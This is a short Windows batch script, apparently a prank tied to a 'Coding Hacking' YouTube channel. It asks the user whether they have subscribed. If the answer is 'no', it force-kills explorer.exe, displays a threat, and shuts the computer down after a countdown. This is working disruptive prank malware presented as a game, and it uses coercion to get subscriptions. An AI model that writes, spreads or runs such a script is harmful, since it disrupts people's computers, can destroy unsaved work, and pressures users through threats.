@echo off
color 18
echo Did you subscribe to the Coding Hacking YouTube channel? (yes/no)
set /p subscribe=
if %subscribe%==yes goto subscriber
if %subscribe%==no goto n
:subscriber
echo Thank you!
pause
exit
:n
taskkill /f /im explorer.exe
echo SUBSCRIBE NOW...
echo Your computer will shut down automatically after 10 seconds...
timeout 10
shutdown -s -t 10
